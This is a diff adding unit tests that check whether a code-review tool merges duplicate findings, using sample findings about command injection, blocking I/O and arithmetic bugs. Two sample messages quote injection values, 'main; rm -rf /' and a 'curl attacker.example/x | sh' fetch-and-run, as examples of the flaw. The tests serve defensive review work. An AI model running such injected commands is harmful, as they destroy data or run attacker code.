@@ -66,6 +66,77 @@ describe('one issue reported twice is posted once', () => {
     expect(isSameFinding(at(20, 'medium finding 20'), at(21, 'medium finding 21'))).toBe(false);
   });
 
+  // Every finding on lines 5, 10 and 11 of the live re-check (#560), as the lenses wrote them.
+  const live = (lens: string, severity: string, category: string, line: number, message: string) =>
+    ({
+      lens,
+      severity,
+      category,
+      line,
+      file: 'sidecar/scripts/scratch-review-target-2.mjs',
+      message,
+    }) as AgentFinding & {
+      lens: string;
+    };
+  const injectionA = live(
+    'security',
+    'high',
+    'command-injection',
+    5,
+    'The new code puts the `name` value directly into a shell command string, and `execSync` runs that string in a shell. A value such as `main; rm -rf /` runs a second command. Any caller that controls `name` runs arbitrary shell commands.',
+  );
+  const injectionB = live(
+    'security',
+    'high',
+    'command-injection',
+    5,
+    'The new function `listBranch` joins the `name` parameter into a shell command string. `execSync` runs that string through a shell. A caller who controls `name` can add shell metacharacters, for example `main; curl attacker.example/x | sh`. The shell then runs the extra command with the privileges of the Node process. The function also accepts any value, because it validates nothing.',
+  );
+  const blockingA = live(
+    'performance',
+    'low',
+    'blocking-io',
+    5,
+    '`execSync` blocks the Node event loop until `git` exits. A caller on a request path stalls all other work in the sidecar process.',
+  );
+  const blockingB = live(
+    'performance',
+    'low',
+    'sync-blocking-call',
+    5,
+    'The new `listBranch` function calls `execSync`. This call blocks the Node.js event loop until the `git` process exits. A process start plus the `git branch --list` read costs tens of milliseconds. If any async path or request handler imports this function, all other work in the process stops for that time. `execSync` also buffers the full output in memory and throws when the output passes the default `maxBuffer` limit of 1 MB.',
+  );
+  const offByOne = live(
+    'reviewer',
+    'high',
+    'correctness',
+    10,
+    'The loop condition is `i <= values.length`, so the last pass reads `values[values.length]`, which is `undefined`. The sum becomes `NaN`. `average` returns `NaN` for every non-empty array.',
+  );
+  const emptyArray = live(
+    'reviewer',
+    'low',
+    'edge-case',
+    11,
+    '`average([])` divides zero by zero and returns `NaN`. The function has no guard for an empty array and reports no clear error to the caller.',
+  );
+
+  it('merges one lens reporting one problem twice, reworded more than two lenses would', () => {
+    expect(messageOverlap(injectionA.message, injectionB.message)).toBeLessThan(0.5);
+    expect(isSameFinding(injectionA, injectionB)).toBe(true);
+    // Same lens and severity, different category names.
+    expect(isSameFinding(blockingA, blockingB)).toBe(true);
+  });
+
+  it('keeps apart the different problems on those lines', () => {
+    for (const injection of [injectionA, injectionB]) {
+      for (const blocking of [blockingA, blockingB]) expect(isSameFinding(injection, blocking)).toBe(false);
+    }
+    expect(isSameFinding(offByOne, emptyArray)).toBe(false);
+    // The lower bar needs the same severity too.
+    expect(isSameFinding(injectionA, { ...injectionB, severity: 'medium' } as AgentFinding)).toBe(false);
+  });
+
   it('matches a finding with no line only on the same text', () => {
     const note = (message: string) => ({ severity: 'low', category: 'style', message }) as AgentFinding;
     expect(isSameFinding(note('Use const here'), note('use  const here'))).toBe(true);
